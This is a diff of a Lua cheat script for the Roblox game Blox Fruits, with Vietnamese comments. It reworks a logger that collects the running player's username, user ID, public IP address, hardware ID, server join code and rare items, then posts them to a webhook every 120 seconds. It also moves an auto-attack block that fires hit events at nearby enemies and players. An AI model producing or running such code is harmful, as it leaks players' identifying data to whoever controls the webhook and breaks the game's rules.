@@ -209,21 +209,15 @@ end
 
 function AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
     local player = game.Players.LocalPlayer
-    local beli = player:FindFirstChild("Data")
-                 and player.Data:FindFirstChild("Beli")
-                 and player.Data.Beli.Value or 0
+    local beli = player:FindFirstChild("Data") and player.Data:FindFirstChild("Beli") and player.Data.Beli.Value or 0
     
-    local inventory = getInventory()
-    if not inventory then
-        return 
-    end
-    
+    -- Kiểm tra inventory trước khi dùng
+    local inventory = getInventory() or {}
     local darkDaggerStatus = "❌"
     local valkyrieHelmStatus = "❌"
     local darkCoatStatus = "❌"
     local number_Dark_Fragments = 0
 
-    -- Kiểm tra các vật phẩm trong inventory
     for _, item in pairs(inventory) do
         if item.Type == "Sword" and (item.Name == "Dark Dagger" or item.Name == "DarkDagger") then
             darkDaggerStatus = "✅"
@@ -239,80 +233,27 @@ function AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
         end
     end
 
-    -- Tạo thông điệp gửi đến admin
     local AdminMessage = {
         embeds = {{
-            title       = "**📦 Inventory Check!**",
+            title = "**📦 Inventory Check!**",
             description = "",
-            color       = tonumber(0xffffff),
+            color = tonumber(0xffffff),
             fields = {
-                {
-                    name   = "**👤 Username**",
-                    value  = "||```" .. player.Name .. "```||",
-                    inline = true
-                },
-                {
-                    name   = "**🗿UserID**",
-                    value  = "```" .. player.UserId .. "```",
-                    inline = true
-                },
-                {
-                    name   = "**💰 Beli**",
-                    value  = "```" .. beli .. "```",  -- Đã loại bỏ format
-                    inline = false
-                },
-                {
-                    name   = "**🌇IP Address**",
-                    value  = "||```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```||",
-                    inline = false
-                },
-                {
-                    name   = "💻 HWID",
-                    value  = "```" .. (gethwid and gethwid() or "Unknown") .. "```",
-                    inline = false
-                },
-                {
-                    name   = "🧭 Job ID",
-                    value  = "```" .. game.JobId .. "```",
-                    inline = false
-                },
-                {
-                    name   = "📜Join Code",
-                    value  = "```lua\n" ..
-                             "game.ReplicatedStorage['__ServerBrowser']:InvokeServer(" ..
-                             "'teleport','" .. game.JobId .. "')```",
-                    inline = false
-                },
-                {
-                    name   = "️♜ God's Chalice 🔳",
-                    value  = hasGodsChalice and "✅" or "❌",
-                    inline = true
-                },
-                {
-                    name   = "♣️ Fist of Darkness ♠️",
-                    value  = hasFistOfDarkness and "✅" or "❌",
-                    inline = true
-                },
-                {
-                    name   = "🔌 Dark Fragment 🔌",
-                    value  = "```" .. (number_Dark_Fragments or 0) .. "```",
-                    inline = true
-                },
-                {
-                    name   = "🧥 Dark Coat 🧥",
-                    value  = darkCoatStatus or "❌",
-                    inline = true
-                },
-                {
-                    name   = "🗡️ Dark Dagger 🗡️",
-                    value  = darkDaggerStatus,
-                    inline = true
-                },
-                {
-                    name   = "🎓 Valkyrie Helm 🎓",
-                    value  = valkyrieHelmStatus,
-                    inline = true
-                },
+                { name = "**👤 Username", value = "||```" .. player.Name .. "```||", inline = true },
+                { name = "**🗿UserID", value = "```" .. player.UserId .. "```", inline = true },
+                { name = "**💰 Beli", value = "```" .. beli .. "```", inline = false },
+                { name = "**🌇IP Address", value = "||```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```||", inline = false },
+                { name = "💻 HWID", value = "```" .. (gethwid and gethwid() or "Unknown") .. "```", inline = false },
+                { name = "🧭 Job ID", value = "```" .. game.JobId .. "```", inline = false },
+                { name = "📜Join Code", value = "```lua\n" ..
+                                              "game.ReplicatedStorage['__ServerBrowser']:InvokeServer(" ..
+                                              "'teleport','" .. game.JobId .. "')```", inline = false },
+                { name = "️♜ God's Chalice 🔳", value = hasGodsChalice and "✅" or "❌", inline = true },
+                { name = "♣️ Fist of Darkness ♠️", value = hasFistOfDarkness and "✅" or "❌", inline = true },
+                { name = "🔌 Dark Fragment 🔌", value = "```" .. (number_Dark_Fragments or 0) .. "```", inline = true },
+                { name = "🧥 Dark Coat 🧥", value = darkCoatStatus or "❌", inline = true },
+                { name = "🗡️ Dark Dagger 🗡️", value = darkDaggerStatus, inline = true },
+                { name = "🎓 Valkyrie Helm 🎓", value = valkyrieHelmStatus, inline = true },
             },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
         }}
@@ -326,7 +267,7 @@ spawn(function()
         local hasGodsChalice = false
         local hasFistOfDarkness = false
 
-        -- Check Invntory
+        -- Lặp qua các vật phẩm trong ba lô
         for _, item in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
             if item.Name == "God's Chalice" then
                 hasGodsChalice = true
@@ -336,14 +277,14 @@ spawn(function()
         end
 
         if getgenv().config.Webhook["Send Webhook"] then
-
+            -- Gọi hàm AdminLoggerMsg và gửi webhook
             local message = AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
             PostWebhook(getgenv().config.Webhook["Webhook Url"], message)
         else
             print("Webhook not enabled.")
         end
 
-        -- Check 120s/1
+        -- Check sau 120s
         task.wait(120)
     end
 end)
@@ -454,36 +395,7 @@ function config()
         return g
     end)("Zzz")
 end
-
 local Config_Lib = config()
-
-local darkCoatStatus = "❌"
-local darkFragmentStatus = "❌"
-
-local number_Dark_Fragments = 0
-for _, item in pairs(inventory) do
-    if item.Type == "Material" and item.Name == "Dark Fragment" then
-        number_Dark_Fragments = item.Amount or 0
-        darkFragmentStatus = "✅" 
-    end
-    
-    if item.Type == "Wear" and (item.Name == "Dark Coat" or item.Name == "DarkCoat") then
-        darkCoatStatus = "✅"
-    end
-end
-
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local CommF_ = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
-local HttpService = game:GetService("HttpService")
-
-local success, inventory = pcall(function()
-	return CommF_:InvokeServer("getInventory")
-end)
-
-if not success or type(inventory) ~= "table" then
-	warn("Can not check inventory")
-	return
-end
 
 local function AntiKick()
     while true do
@@ -578,148 +490,6 @@ local function Tween2(targetCFrame)
     end)
 end
 
-_G.FastAttack = true
-
-if _G.FastAttack then
-    local _ENV = (getgenv or getrenv or getfenv)()
-
-    local function SafeWaitForChild(parent, childName)
-        local success, result = pcall(function()
-            return parent:WaitForChild(childName)
-        end)
-        if not success or not result then
-            warn("noooooo: " .. childName)
-        end
-        return result
-    end
-
-    local function WaitChilds(path, ...)
-        local last = path
-        for _, child in {...} do
-            last = last:FindFirstChild(child) or SafeWaitForChild(last, child)
-            if not last then break end
-        end
-        return last
-    end
-
-    local VirtualInputManager = game:GetService("VirtualInputManager")
-    local CollectionService = game:GetService("CollectionService")
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    local TeleportService = game:GetService("TeleportService")
-    local RunService = game:GetService("RunService")
-    local Players = game:GetService("Players")
-    local Player = Players.LocalPlayer
-
-    if not Player then
-        warn("KhÃ´ng tÃ¬m tháº¥y ngÆ°á»i chÆ¡i cá»¥c bá».")
-        return
-    end
-
-    local Remotes = SafeWaitForChild(ReplicatedStorage, "Remotes")
-    if not Remotes then return end
-
-    local Validator = SafeWaitForChild(Remotes, "Validator")
-    local CommF = SafeWaitForChild(Remotes, "CommF_")
-    local CommE = SafeWaitForChild(Remotes, "CommE")
-
-    local ChestModels = SafeWaitForChild(workspace, "ChestModels")
-    local WorldOrigin = SafeWaitForChild(workspace, "_WorldOrigin")
-    local Characters = SafeWaitForChild(workspace, "Characters")
-    local Enemies = SafeWaitForChild(workspace, "Enemies")
-    local Map = SafeWaitForChild(workspace, "Map")
-
-    local EnemySpawns = SafeWaitForChild(WorldOrigin, "EnemySpawns")
-    local Locations = SafeWaitForChild(WorldOrigin, "Locations")
-
-    local RenderStepped = RunService.RenderStepped
-    local Heartbeat = RunService.Heartbeat
-    local Stepped = RunService.Stepped
-
-    local Modules = SafeWaitForChild(ReplicatedStorage, "Modules")
-    local Net = SafeWaitForChild(Modules, "Net")
-
-    local sethiddenproperty = sethiddenproperty or function(...) return ... end
-    local setupvalue = setupvalue or (debug and debug.setupvalue)
-    local getupvalue = getupvalue or (debug and debug.getupvalue)
-
-    local Settings = {
-        AutoClick = true,
-        ClickDelay = 0,
-    }
-
-    local Module = {}
-
-    Module.FastAttack = (function()
-        if _ENV.rz_FastAttack then
-            return _ENV.rz_FastAttack
-        end
-
-        local FastAttack = {
-            Distance = 100,
-            attackMobs = true,
-            attackPlayers = true,
-            Equipped = nil
-        }
-
-        local RegisterAttack = SafeWaitForChild(Net, "RE/RegisterAttack")
-        local RegisterHit = SafeWaitForChild(Net, "RE/RegisterHit")
-
-        local function IsAlive(character)
-        return character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0
-        end
-
-        local function ProcessEnemies(OthersEnemies, Folder)
-            local BasePart = nil
-            for _, Enemy in Folder:GetChildren() do
-                local Head = Enemy:FindFirstChild("Head")
-                if Head and IsAlive(Enemy) and Player:DistanceFromCharacter(Head.Position) < FastAttack.Distance then
-                    if Enemy ~= Player.Character then
-                        table.insert(OthersEnemies, { Enemy, Head })
-                        BasePart = Head
-                    end
-                end
-            end
-            return BasePart
-        end
-
-        function FastAttack:Attack(BasePart, OthersEnemies)
-            if not BasePart or #OthersEnemies == 0 then return end
-            RegisterAttack:FireServer(Settings.ClickDelay or 0)
-            RegisterHit:FireServer(BasePart, OthersEnemies)
-        end
-
-        function FastAttack:AttackNearest()
-            local OthersEnemies = {}
-            local Part1 = ProcessEnemies(OthersEnemies, Enemies)
-            local Part2 = ProcessEnemies(OthersEnemies, Characters)
-            if #OthersEnemies > 0 then
-                self:Attack(Part1 or Part2, OthersEnemies)
-            else
-                task.wait(0)
-            end
-        end
-
-        function FastAttack:BladeHits()
-            local Equipped = IsAlive(Player.Character) and Player.Character:FindFirstChildOfClass("Tool")
-            if Equipped and Equipped.ToolTip ~= "Gun" then
-                self:AttackNearest()
-            else
-                task.wait(0)
-            end
-        end
-
-        task.spawn(function()
-            while task.wait(Settings.ClickDelay) do
-                if Settings.AutoClick then
-                    FastAttack:BladeHits()
-                end
-            end
-        end)
-
-        _ENV.rz_FastAttack = FastAttack
-        return FastAttack
-    end)()
-end
 --------------------------------------------------------------------------------
 local Players            = game:GetService("Players")
 local TweenService       = game:GetService("TweenService")
@@ -1470,6 +1240,149 @@ function EquipWeapon(ToolSe)
 			game.Players.LocalPlayer.Character.Humanoid:EquipTool(Tool);
 		end
 	end
+end
+
+_G.FastAttack = true
+
+if _G.FastAttack then
+    local _ENV = (getgenv or getrenv or getfenv)()
+
+    local function SafeWaitForChild(parent, childName)
+        local success, result = pcall(function()
+            return parent:WaitForChild(childName)
+        end)
+        if not success or not result then
+            warn("noooooo: " .. childName)
+        end
+        return result
+    end
+
+    local function WaitChilds(path, ...)
+        local last = path
+        for _, child in {...} do
+            last = last:FindFirstChild(child) or SafeWaitForChild(last, child)
+            if not last then break end
+        end
+        return last
+    end
+
+    local VirtualInputManager = game:GetService("VirtualInputManager")
+    local CollectionService = game:GetService("CollectionService")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local TeleportService = game:GetService("TeleportService")
+    local RunService = game:GetService("RunService")
+    local Players = game:GetService("Players")
+    local Player = Players.LocalPlayer
+
+    if not Player then
+        warn("KhÃ´ng tÃ¬m tháº¥y ngÆ°á»i chÆ¡i cá»¥c bá».")
+        return
+    end
+
+    local Remotes = SafeWaitForChild(ReplicatedStorage, "Remotes")
+    if not Remotes then return end
+
+    local Validator = SafeWaitForChild(Remotes, "Validator")
+    local CommF = SafeWaitForChild(Remotes, "CommF_")
+    local CommE = SafeWaitForChild(Remotes, "CommE")
+
+    local ChestModels = SafeWaitForChild(workspace, "ChestModels")
+    local WorldOrigin = SafeWaitForChild(workspace, "_WorldOrigin")
+    local Characters = SafeWaitForChild(workspace, "Characters")
+    local Enemies = SafeWaitForChild(workspace, "Enemies")
+    local Map = SafeWaitForChild(workspace, "Map")
+
+    local EnemySpawns = SafeWaitForChild(WorldOrigin, "EnemySpawns")
+    local Locations = SafeWaitForChild(WorldOrigin, "Locations")
+
+    local RenderStepped = RunService.RenderStepped
+    local Heartbeat = RunService.Heartbeat
+    local Stepped = RunService.Stepped
+
+    local Modules = SafeWaitForChild(ReplicatedStorage, "Modules")
+    local Net = SafeWaitForChild(Modules, "Net")
+
+    local sethiddenproperty = sethiddenproperty or function(...) return ... end
+    local setupvalue = setupvalue or (debug and debug.setupvalue)
+    local getupvalue = getupvalue or (debug and debug.getupvalue)
+
+    local Settings = {
+        AutoClick = true,
+        ClickDelay = 0,
+    }
+
+    local Module = {}
+
+    Module.FastAttack = (function()
+        if _ENV.rz_FastAttack then
+            return _ENV.rz_FastAttack
+        end
+
+        local FastAttack = {
+            Distance = 100,
+            attackMobs = true,
+            attackPlayers = true,
+            Equipped = nil
+        }
+
+        local RegisterAttack = SafeWaitForChild(Net, "RE/RegisterAttack")
+        local RegisterHit = SafeWaitForChild(Net, "RE/RegisterHit")
+
+        local function IsAlive(character)
+        return character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0
+        end
+
+        local function ProcessEnemies(OthersEnemies, Folder)
+            local BasePart = nil
+            for _, Enemy in Folder:GetChildren() do
+                local Head = Enemy:FindFirstChild("Head")
+                if Head and IsAlive(Enemy) and Player:DistanceFromCharacter(Head.Position) < FastAttack.Distance then
+                    if Enemy ~= Player.Character then
+                        table.insert(OthersEnemies, { Enemy, Head })
+                        BasePart = Head
+                    end
+                end
+            end
+            return BasePart
+        end
+
+        function FastAttack:Attack(BasePart, OthersEnemies)
+            if not BasePart or #OthersEnemies == 0 then return end
+            RegisterAttack:FireServer(Settings.ClickDelay or 0)
+            RegisterHit:FireServer(BasePart, OthersEnemies)
+        end
+
+        function FastAttack:AttackNearest()
+            local OthersEnemies = {}
+            local Part1 = ProcessEnemies(OthersEnemies, Enemies)
+            local Part2 = ProcessEnemies(OthersEnemies, Characters)
+            if #OthersEnemies > 0 then
+                self:Attack(Part1 or Part2, OthersEnemies)
+            else
+                task.wait(0)
+            end
+        end
+
+        function FastAttack:BladeHits()
+            local Equipped = IsAlive(Player.Character) and Player.Character:FindFirstChildOfClass("Tool")
+            if Equipped and Equipped.ToolTip ~= "Gun" then
+                self:AttackNearest()
+            else
+                task.wait(0)
+            end
+        end
+
+        task.spawn(function()
+            while task.wait(Settings.ClickDelay) do
+                if Settings.AutoClick then
+                    FastAttack:BladeHits()
+                end
+            end
+        end)
+
+        _ENV.rz_FastAttack = FastAttack
+        return FastAttack
+    end)()
 end
 
 _G.SelectWeapon = "Melee";
